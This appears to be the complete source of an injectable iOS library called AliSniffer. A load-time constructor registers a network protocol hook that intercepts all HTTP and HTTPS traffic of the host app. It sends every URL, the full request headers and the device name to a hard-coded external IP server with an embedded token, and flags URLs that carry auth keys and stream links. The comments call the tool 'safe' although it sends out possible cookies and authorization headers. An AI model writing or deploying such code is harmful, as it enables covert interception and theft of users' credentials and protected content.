
//
// AliSniffer_min_safe_filtered_verbose.m
// Minimal safe sniffer with filtering, but uploads *all* observed URLs with a "decision" field
// so you can see whether the code decided to SKIP or UPLOAD each URL (helps debug injection/version issues).
// - Registers a lightweight NSURLProtocol to observe HTTP/HTTPS requests.
// - Decides SKIP/UPLOAD using same rules as filtered version, but always sends a record to server with "decision".
// - Useful when you cannot see device console; server will show why each URL was classified.
//
// Change kLogUploadEndpoint / kLogUploadToken to your server before injection.
//
#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>

#define LOG(...) NSLog(__VA_ARGS__)

static NSString * const kLogUploadEndpoint = @"http://139.155.57.242:8088/api/push_raw";
static NSString * const kLogUploadToken    = @"@Yy166431";

static void UploadRecordAsync(NSDictionary *rec) {
    if (!rec) return;
    NSData *d = nil;
    @try { d = [NSJSONSerialization dataWithJSONObject:rec options:0 error:NULL]; } @catch(...) { d = nil; }
    if (!d) return;
    NSURL *u = [NSURL URLWithString:kLogUploadEndpoint];
    if (!u) return;
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:u];
    req.HTTPMethod = @"POST";
    [req setValue:kLogUploadToken forHTTPHeaderField:@"X-Token"];
    [req setValue:@"application/json; charset=utf-8" forHTTPHeaderField:@"Content-Type"];
    req.HTTPBody = d;
    NSURLSessionConfiguration *cfg = [NSURLSessionConfiguration ephemeralSessionConfiguration];
    cfg.timeoutIntervalForRequest = 8.0;
    NSURLSession *s = [NSURLSession sessionWithConfiguration:cfg];
    NSURLSessionDataTask *t = [s dataTaskWithRequest:req completionHandler:^(__unused NSData * _Nullable data, __unused NSURLResponse * _Nullable resp, NSError * _Nullable err) {
        if (err) LOG(@"[AliSniffer][UPLOAD] err: %@", err);
    }];
    [t resume];
}

static void DebugLog(NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    @try { NSLog(@"[AliSniffer][MIN-V] %@", s); } @catch(...) {}
}

// ===== Filtering helpers =====
static inline BOOL HasAuthKeyInURL(NSString *url) {
    if (!url) return NO;
    NSString *l = url.lowercaseString;
    return ([l containsString:@"auth_key="] || [l containsString:@"authkey="]);
}
static inline BOOL IsPlayableCandidate(NSString *url) {
    if (!url) return NO;
    NSString *l = url.lowercaseString;
    if ([l containsString:@"m3u8"] || [l containsString:@".mp4"] || [l containsString:@".flv"]) return YES;
    if ([l hasPrefix:@"rtmp://"] || [l hasPrefix:@"rtmps://"]) return YES;
    if (([l hasPrefix:@"ws://"] || [l hasPrefix:@"wss://"]) && [l containsString:@".flv"]) return YES;
    return NO;
}
static inline BOOL IsKnownNoise(NSString *url) {
    if (!url) return NO;
    NSString *l = url.lowercaseString;
    NSArray *noise = @[@"ulogs.umeng.com", @"umeng", @"umengcloud", @"log.aliyuncs.com", @"beacon", @"/monitor", @"/ums", @"collect", @"analytics", @"sentry", @"ingress", @"ping", @"stats"];
    for (NSString *n in noise) {
        if ([l containsString:n]) return YES;
    }
    return NO;
}

// Decide and upload a record that includes decision (SKIP/UPLOAD) and reason
static void DecideAndUpload(NSString *url, NSDictionary *hdrs, NSString *note) {
    if (!url) url = @"";
    NSString *decision = @"skip";
    NSString *reason = @"unknown";
    if (IsKnownNoise(url) && !HasAuthKeyInURL(url)) {
        decision = @"skip";
        reason = @"known_noise";
    } else if (HasAuthKeyInURL(url)) {
        decision = @"upload";
        reason = @"has_auth_key";
    } else if (IsPlayableCandidate(url)) {
        decision = @"upload";
        reason = @"playable_candidate";
    } else {
        decision = @"skip";
        reason = @"not_playable";
    }

    NSMutableDictionary *rec = [NSMutableDictionary dictionary];
    rec[@"url"] = url;
    rec[@"time"] = @([[NSDate date] timeIntervalSince1970]);
    rec[@"decision"] = decision;
    rec[@"reason"] = reason;
    if (hdrs) rec[@"headers"] = hdrs;
    if (note) rec[@"note"] = note;
    rec[@"device"] = @{@"name": UIDevice.currentDevice.name ?: @"", @"sys": UIDevice.currentDevice.systemVersion ?: @""};

    DebugLog(@"DECIDE %@ (%@) url=%@", decision, reason, url);
    UploadRecordAsync(rec);
}

// Minimal NSURLProtocol that simply observes requests and lets them proceed.
@interface _MinObserveProtoV : NSURLProtocol <NSURLSessionDataDelegate>
@property(nonatomic,strong) NSURLSessionDataTask *task;
@end

@implementation _MinObserveProtoV
+ (BOOL)canInitWithRequest:(NSURLRequest *)request {
    @try {
        if (!request || !request.URL) return NO;
        if ([NSURLProtocol propertyForKey:@"_alisniffer_min_v" inRequest:request]) return NO;
        NSString *scheme = request.URL.scheme.lowercaseString ?: @"";
        if ([scheme isEqualToString:@"http"] || [scheme isEqualToString:@"https"]) return YES;
    } @catch(...) {}
    return NO;
}
+ (NSURLRequest *)canonicalRequestForRequest:(NSURLRequest *)request { return request; }

- (void)startLoading {
    NSMutableURLRequest *r = [self.request mutableCopy];
    @try { [NSURLProtocol setProperty:@YES forKey:@"_alisniffer_min_v" inRequest:r]; } @catch(...) {}
    @try { DecideAndUpload(r.URL.absoluteString, r.allHTTPHeaderFields ?: @{}, @"min_proto_v"); } @catch(...) {}
    // Perform the real request with default session and stream results back to client.
    NSURLSessionConfiguration *cfg = [NSURLSessionConfiguration defaultSessionConfiguration];
    NSURLSession *s = [NSURLSession sessionWithConfiguration:cfg delegate:self delegateQueue:nil];
    self.task = [s dataTaskWithRequest:r];
    [self.task resume];
}

- (void)stopLoading {
    @try { [self.task cancel]; } @catch(...) {}
    self.task = nil;
}

- (void)URLSession:(NSURLSession *)session dataTask:(NSURLSessionDataTask *)dataTask didReceiveData:(NSData *)data {
    @try { [self.client URLProtocol:self didLoadData:data]; } @catch(...) {}
}

- (void)URLSession:(NSURLSession *)session task:(NSURLSessionTask *)task didCompleteWithError:(NSError *)error {
    if (error) {
        @try { [self.client URLProtocol:self didFailWithError:error]; } @catch(...) {}
    } else {
        @try { [self.client URLProtocolDidFinishLoading:self]; } @catch(...) {}
    }
}
@end

// Constructor: register the minimal protocol safely.
__attribute__((constructor))
static void _alisniffer_min_v_init(void) {
    @autoreleasepool {
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.2 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            @try {
                [NSURLProtocol registerClass:[_MinObserveProtoV class]];
                DebugLog(@"registered minimal protocol V");
                // upload a heartbeat so you can confirm endpoint is reachable
                UploadRecordAsync(@{@"note":@"init_v", @"time": @([[NSDate date] timeIntervalSince1970]), @"device": @{@"name": UIDevice.currentDevice.name ?: @"", @"sys": UIDevice.currentDevice.systemVersion ?: @""}});
            } @catch (NSException *e) {
                DebugLog(@"register failed: %@", e);
            }
        });
    }
}
